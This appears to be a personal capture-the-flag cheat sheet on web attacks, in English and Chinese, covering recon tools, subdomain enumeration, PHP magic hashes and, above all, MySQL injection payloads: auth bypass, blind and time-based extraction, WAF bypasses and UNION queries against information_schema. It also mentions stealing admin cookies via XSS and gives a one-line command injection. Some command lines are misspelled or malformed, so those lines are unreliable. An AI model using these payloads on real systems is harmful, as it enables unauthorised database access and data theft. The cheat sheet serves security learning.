# Web

# Table of Contents
* [Tools](#Tools)
* [F12](#F12)
* [Content Discovery](#Content-Discovery)
* [Subdomain Enumeration](#Subdomain-Enumeration)
* [PHP](#PHP)
* [HTTP 302](#HTTP-302)
* [Directory Listing](#Directory-Listing)
* [Cookie](#Cookie)
* [SQL Injection](#SQL-Injection)
  * [MySQL](#MySQL)
* [XSS Injection](#XSS-Injection)
* [Command Injection](#Command-Injection)
* [XML Injection](#XML-Injection)

## Tools
* [HackBar](https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc) : A simple security audit / Penetration test tool for testing sql injections, XSS holes and site security.
* [Wayback Machine](https://archive.org/web/) : Explore web pages saved over time.
* [RequestBin](https://requestbin.com/) : Get a URL that collects requests you send it. (Can be used with XSS to get admin cookies)
* [Wappalyzer](https://www.wappalyzer.com/): Identify technologies on websites.
* [ffuf](https://github.com/ffuf/ffuf): Fast web fuzzer written in Go.
* [dirb](https://www.kali.org/tools/dirb/): Scan the web server for directories using a dictionary file.
* [gobuster](https://github.com/OJ/gobuster): Directory/File, DNS and VHost busting tool written in Go.
* [dnsrecon](https://www.kali.org/tools/dnsrecon/): DNS enumeration script.
* [Sublist3r](https://github.com/aboul3la/Sublist3r): Fast subdomains enumeration tool for penetration testers.

## F12
* Check Network header/response
* Use console to do js function overwrite
* Debugger
  * Use "Pretty Print" option (looks like 2 braces {}) to make minimised file readable
  * Click on line number to set break points

## Content Discovery
* Manual
  * /robots.txt: Used by websites to communicate with web crawlers about which areas of the website should not be processed or scanned.
  * Favicon: The small picture in the website tab. If the website developer doesn't change it to a custom one, the favicon of the framework used by the website might be displayed.
    * `curl <favicon url> | md5sum`
    * Then lookup the md5 hash in [OWASP favicon database](https://wiki.owasp.org/index.php/OWASP_favicon_database)
  * /sitemap.xml: Gives a list of every file the website owner wishes to be listed on a search engine.
  * HTTP headers: Use `curl <website url> -v` to get the headers.
  * Framework: Check the framework documentation.
* OSINT
  * Google Hacking/Dorking: Google's advanced search engine
    * site:example.com
    * inurl:admin
    * filetype:pdf
    * intitle:admin
  * [Wayback Machine](https://archive.org/web/): Explore web pages saved over time.
  * [Wappalyzer](https://www.wappalyzer.com/): Identify technologies on websites.
  * Github
  * S3 Buckets: Storage service provided by Amazon AWS. The owner of the files can set permission to public, private and writable.
    * http(s)://{name}.s3.amazonaws.com
    * Common terms: {name}-assets, {name}-www, {name}-public, {name}-private, ...
* Automated
  * [SecLists](https://github.com/danielmiessler/SecLists): A wordlist that includes usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and more.
  * [ffuf](https://github.com/ffuf/ffuf)
    * `fuff -w <wordlist path> -u <url>`
  * [dirb](https://www.kali.org/tools/dirb/)
    * `dirb <url> <wordlist path>` 
  * [gobuster](https://github.com/OJ/gobuster)
    * `gobuster dir --url <url> -w <wordlist path>`

## Subdomain Enumeration
* https://en.wikipedia.org -> `en` is a subdomain of `wikipedia.org`
* SSL/TLS Certificate Transparency (CT) logs: Publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose is to stop malicious and accidentally made certificates from being used.
  * https://crt.sh/
  * https://transparencyreport.google.com/https/certificates
* `-site:www.domain.com site:*.domain.com` would only contain results leading to domain.com but excluding any links to www.domain.com
* DNS bruteforce: `dnsrecon -t brt -d <domain>`
* `./sublist3r.py -d <domain>`
* Some subdomains aren't hosted in publically accessible DNS results, such as development versions or administration portals. These DNS records could be kept on a private DNS server or recorded on the developer's machines in /etc/hosts file (C:\windows\system32\drivers\etc\hosts for Windows). The server knows which website the client wants from the **Host** header.
  * `fuff -w <wordlist path> -H "Host:FUZZ.<domain>" -u http://MACHINE_IP`: The -H switch adds/edits a header, using the FUZZ keyword in the space where a subdomain would normally go.
  * Add -fs {size} to filter out any results of the specified size.

## PHP
* [Magic Hashes](https://github.com/spaze/hashes)
  * For php, `'0e123' == '00e456' == '0'` since they all translate to float 0 (0e followed by digits is interpreted as scientific notation)

## HTTP 302
* **Moved Temporarily**, 可以簡單的理解為該資源原本確實存在，但已經被臨時改變了位置；換而言之，就是請求的資源暫時駐留在不同的URI下。
* `curl` only redirects when adding parameter `-L`
* Use `curl` to view the original page

## Directory Listing

## Cookie

## SQL Injection
### MySQL
* `'or 1 = 1 -- `
* 選取特定資料 : `'or 1 = 1 limit 1,1 -- `
  * 從offset=1開始選取前50筆資料(略過最前面1筆)
  * `limit 1,50`
* Blind sql injection
  * 有時候資料庫查詢只會顯示成功或失敗，不會顯示資料
  * 透過True/Flase回傳去判斷
    * `id = 'admin' and ascii(mid(password, 1, 1))>0 --` => True
    * `id = 'admin' and ascii(mid(password, 1, 1))>100 --` => False
    * `mid()` : 從字串索引值 start 開始截取共 length 長度的字串
  * 沒有回傳可以透過時間
    * `id = 'admin' and if(ascii(mid(password,1,1))>0, sleep(5), 1)=1`
    * if(condition, when_true, when_false)
* Bypass WAF
  * 對大小寫不敏感
  * 空白
    * /**/,%09, %0a, %0b, %0c, %0d, %a0
    * OR(1=1)
  * OR => ||, AND => &&
    * &直接傳過去是有特殊涵意的，例如?key1=value1&key2=value2
    * 用%26取代
  * = => LIKE
  * LIMIT 0,1 => LIMIT 1 OFFSET 0
* `@@version` : 同`version()`，回傳資料庫版本
* `user()` : 回傳使用者名稱
* `information_schema`
  * SQL內建的資料庫，會儲存資料庫內部的資訊，例如所有table/column name
  * 透過leak information_schema取得想要的資料庫
  * databasename is at `information_schema.schemata`
  * tablename is at `information_schema.tables`
  * columnname is at `information_schema.columns`
  * leak database name
    * `'union select schema_name,1 from information_schema.schemata #`
    * can add `limit` to find certain information
  * leak table name
    * `'union select table_name,1 from information_schema.tables where table_schema like '$databasename'#`
  * leak column name
    * `'union select column_name,1 from information_schema.columns where table_name like '$tablename'#`
  * With the 3 information above found, leak the information
    * `'union select $columnname,1 from $databasename.$tablename#` 


## XSS Injection

## Command Injection
* `ping $whoami`

## XML Injection
